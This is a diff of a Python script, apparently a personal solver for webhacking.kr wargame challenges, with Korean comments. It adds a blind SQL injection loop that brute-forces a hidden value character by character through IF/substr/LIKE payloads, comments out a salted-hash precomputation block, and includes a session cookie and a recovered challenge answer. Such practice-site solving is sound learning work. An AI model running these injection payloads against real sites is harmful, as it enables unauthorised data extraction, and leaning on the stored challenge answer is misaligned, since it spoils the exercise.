@@ -3,7 +3,7 @@ import hashlib
 url="https://webhacking.kr/challenge/web-31/rank.php?score=1%20and%20"
 
 
-cookie={"PHPSESSID":"qcmgf42tr67e5utktgvphggalk"}
+cookie={"PHPSESSID":"c9e8hno27k6mhlp8m7j3f35rmm"}
 session=requests.Session()
 
 password=""
@@ -72,6 +72,7 @@ for i in range(1,50): #원래는 1 부터 길이+1 까지
 
 print(passwd)
 '''
+'''
 url="https://webhacking.kr/challenge/web-04/index.php?"
 def sha(no): ## sha값 계산, 500번
     data = f"{no}salt_for_you"
@@ -84,4 +85,19 @@ for i in range(10000000, 99999999):
     f.write(f"{i}: {sha(i)}\n") #{no}salt_for_you를 500번 해쉬한값을 모두 저장
     print(i)
 f.close()
+'''
 
+url="https://webhacking.kr/challenge/web-09/index.php?no=IF(substr(id,"
+passwd=""
+for i in range(1,12): #원래는 1 부터 길이+1 까지
+    for j in range(33, 127): #hex변환할 글자 33 = !, 126 = ~(전까지) format(j,'x')
+        if(chr(j)=="%"):
+            continue
+        payload=session.get(url+str(i)+",1)LIKE("+hex(j)+"),3,5)",cookies=cookie)
+        print(url+str(i)+",1)LIKE("+format(j,'x')+"),3,5)")
+        if ("Secret" in payload.text):
+            print(chr(j) + " is correct!!!!!!!")
+            passwd += chr(j)
+            print(passwd)
+    passwd +=" "
+print(passwd) #alsrkswhaql
